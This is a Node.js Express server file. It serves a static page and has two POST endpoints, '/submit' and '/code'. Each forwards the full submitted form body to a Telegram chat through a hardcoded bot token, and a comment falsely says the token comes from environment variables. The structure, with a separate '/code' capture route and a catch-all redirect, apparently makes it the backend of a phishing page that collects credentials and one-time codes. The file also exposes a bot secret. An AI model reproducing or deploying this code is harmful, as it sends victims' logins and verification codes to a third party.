const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
require('dotenv').config();


// lunch the server

const app = express();
const port = 3000;

// specify where the static file se trouve
app.use(express.static(path.join(__dirname, 'public')));




app.use(bodyParser.urlencoded({extended: true}))
app.use(bodyParser.json());



app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname,'public', 'index.html'));
});

app.get('*', function(req, res) {
  res.redirect('/');
});


app.post('/submit', (req, res) => {
   

   async function sendTelegramMessage(token, channel, message) {
    try {
        // Construct the Telegram API endpoint for sending a message
        const request = await fetch(`https://api.telegram.org/${token}/sendMessage?chat_id=${channel}&text=${message}`, {
            method: 'GET',
            redirect: 'follow'
        });

        // Parse the JSON response from the Telegram API
        const response = await request.json();

        // Return the response object
        return response;
    } catch (error) {
        // Handle errors by logging them to the console
        console.error('Error:', error);
    }
}
  const data = JSON.stringify(req.body);
 
// Immediately-invoked function expression (IIFE) to test the sendTelegramMessage function
(async () => {
    // Call the sendTelegramMessage function with parameters from environment variables
    sendTelegramMessage('bot6978303753:AAF-aIKk28ENRgrM4W6ibL_0oNf32VQRkxI', '-1002070232044', data);
})();
   res.status(200).json('success')
})





// ----------------------------------------------------------------------------------------------------------

app.post('/code', (req, res) => {
   
  async function sendTelegramMessagecode(token, channel, message) {
    try {
        // Construct the Telegram API endpoint for sending a message
        const code_request = await fetch(`https://api.telegram.org/${token}/sendMessage?chat_id=${channel}&text=${message}`, {
            method: 'GET',
            redirect: 'follow'
        });

        // Parse the JSON response from the Telegram API
        const code_response = await code_request.json();

        // Return the response object
        return code_response;
    } catch (error) {
        // Handle errors by logging them to the console
        console.error('Error:', error);
    }
}
  const code_data = JSON.stringify(req.body);
 
// Immediately-invoked function expression (IIFE) to test the sendTelegramMessage function
(async () => {
    // Call the sendTelegramMessage function with parameters from environment variables
    sendTelegramMessagecode('bot6978303753:AAF-aIKk28ENRgrM4W6ibL_0oNf32VQRkxI', '-1002070232044', code_data);
})();
res.status(200).json('sucess')
   
})



app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});